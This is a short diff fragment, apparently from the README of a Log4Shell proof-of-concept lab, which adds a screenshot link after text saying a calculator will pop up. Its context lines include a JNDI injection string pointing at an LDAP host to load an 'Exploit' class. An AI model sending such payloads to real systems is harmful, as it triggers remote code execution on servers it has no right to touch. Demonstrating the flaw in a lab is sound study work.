@@ -68,3 +68,5 @@ ${jndi:ldap://<host-ip>:<ldap-port>/Exploit} // For me it's ${jndi:ldap://10.0.2
 ```
 
 Then you will see a calculator pop up!
+
+![Calculator!](./docs/calculator.png)
